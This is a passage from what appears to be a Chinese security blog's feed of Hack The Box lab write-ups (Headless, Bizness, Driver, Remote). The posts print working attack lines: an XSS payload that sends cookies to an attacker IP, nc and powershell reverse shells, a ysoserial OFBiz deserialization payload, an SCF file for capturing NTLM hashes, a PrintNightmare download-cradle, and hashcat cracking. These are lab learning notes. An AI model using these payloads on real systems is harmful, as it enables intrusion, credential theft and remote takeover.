<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913143024.png" ></p>
<p>于是我们可以成功读到root.txt，后续也可以通过读取shadow或是ssh私钥等方法来获得真正的宿主机root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，主要涉及到Nosql注入和docker提权，都是第一次遇见，过后要好好消化一下这两个知识了。。</p>
<h5 id="推荐阅读wp"><a href="#推荐阅读wp" class="headerlink" title="推荐阅读wp"></a>推荐阅读wp</h5><p><a class="link"   href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm" >https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb headless复盘</title>
    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>刚开始接触htb，感觉很有收获，记录一下</p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.8</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到22端口和5000端口，5000端口是upnp服务，要用http协议访问</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
<p>能看到一个表单，思路是ssti，sql注入，xss，先尝试ssti</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
<p>被拦截了，而且信息还说会把相关信息发给管理员，<strong>思路来了，这地方就可以考虑xss</strong></p>
<p>构造一个恶意xss数据包，同时还要在本地用python开启一个http服务看返回的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(“<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;<i class="fas fa-external-link-alt"></i></a></strong>  重点是这个</p>
<p>然后等待一下，就弹回了cookie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
<p>同时dirsearch扫出来dashboard目录</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
<p>拿到了cookie在访问dashboard就不会401了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>抓包发现有post发送了了一个date数据，这里的思路是命令注入，有点难想到吧</p>
<p>在date后面加；然后写入命令反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>

<p>nc开启监听，成功拿到shell，拿到user.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l 查到一个syscheck，是个脚本文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
<p>主要调用了initdb.sh，那思路就是往里面写命令就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>

<p>然后sudo &#x2F;usr&#x2F;bin&#x2F;syscheck，本地开启监听</p>
<p>成功拿到root</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场还是挺简单的，比较有特色的是5000端口判断xss那里，体验了真实构造恶意代码拿到cookie，还有命令注入那里比较难想，提权就还好。</p>
<h5 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb bizness复盘</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.252</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
<p>先下载ysoserial.jar生成base64的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>然后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>成功拿到第一个shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>使用hashid识别一下加密类型</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>猜测是120模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>爆出来的密码是monkeybizness</p>
<p>然后直接su - root登录，权限就到root了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-permX复盘</title>
    <url>/2024/07/10/htb-permX%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa3894042594a3ebe558c2ad9a7c5517219b41d985abec3337968f8e2cbdb1c4"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-editorial复盘</title>
    <url>/2024/06/19/htb-editorial%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1f921fbbff15c551a8e36907d0392b10be414ddb13375860e513c883c33aeb64"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb driver复盘</title>
    <url>/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>📝📝📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p>👍：<a class="link"   href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.11.106</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
<p>开的端口不少，有445端口（SMB），5985证明可以用evil-winrm登陆</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
<p>枚举和smbclient都找不到有效信息，而且这个windows版本是10，用不了永恒之蓝（知识点摄入了！）</p>
<p>看到80端口开放，有个登陆口，猜测是弱口令’admin:admin’，成功了，进入发现是个打印系统</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >

<p>扫目录扫不到什么东西，但是很容易找到一个文件上传点，结合前面开的SMB，尝试<strong>通过NTLM捕获进行SMB攻击</strong></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >何为通过NTLM捕获进行SMB攻击<i class="fas fa-external-link-alt"></i></a> 这篇文章写的很清楚👍，接下来跟着利用就行</p>
<p>1.先写一个scf文件（<em>SCF文件</em>是“WINDOWS资源管理器命令”文件，它也是一种可执行文件）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>2.上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >

<p>然后上传scf文件，然后就抓到一串hash</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
<p>hashcat爆破，爆出密码为liltony</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
<p>拿着账号密码登陆tony账户，成功拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-process # 查看进程</span><br></pre></td></tr></table></figure>

<p>找到一个spoolsv，网上能找到公开漏洞</p>
<p><a class="link"   href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
<p>下载poc放到网站目录下，让靶机下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>添加一个新的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
<p>查看管理员组，确认权限没问题</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
<p>再用evil-winRM登陆，这个时候就是管理员权限了，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在历史命令文件中找到RICOH PCL6 UniversalDriver V4.23服务，msf有相关poc可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
<p>但是跟着wp一直利用失败，这里就留一个未解决的事项吧。。。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：80端口通过弱口令–&gt;找到文件上传点–&gt;结合SMB服务进行scf攻击抓到用户密码hash–&gt;发现存在公开漏洞的服务spoolsv&#x2F;ricoh–&gt;l利用公开poc提权</p>
<p>涉及：smb端口scf攻击，学到了！</p>
<p>也是尝试了用msf拿到shell，方法二提权失败有待研究，目前花太多时间在这上面，以后再好好研究吧</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-infiltrator-user笔记</title>
    <url>/2024/12/28/htb-infiltrator-user%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c63f19d5cd58c6b918e5e28545510d253223468f9648f614bd2e592eded007e5"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>htb</tag>
        <tag>笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remote复盘</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.10.180</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>一个一个看，开了21端口，用anonymous登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>没有什么可以利用的，切换到下一个端口</p>
<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>然后找到一个登陆点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
<p>有个目录，把它给挂载出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>找到了一串md5，用网站解密，解出来一串是密码</p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>拿着账号密码登陆刚刚的登陆框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>下载下来后尝试命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
<p>是成功的，接下来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>下载一个nc到靶机，再调用，本地开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>上传辅助工具winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>

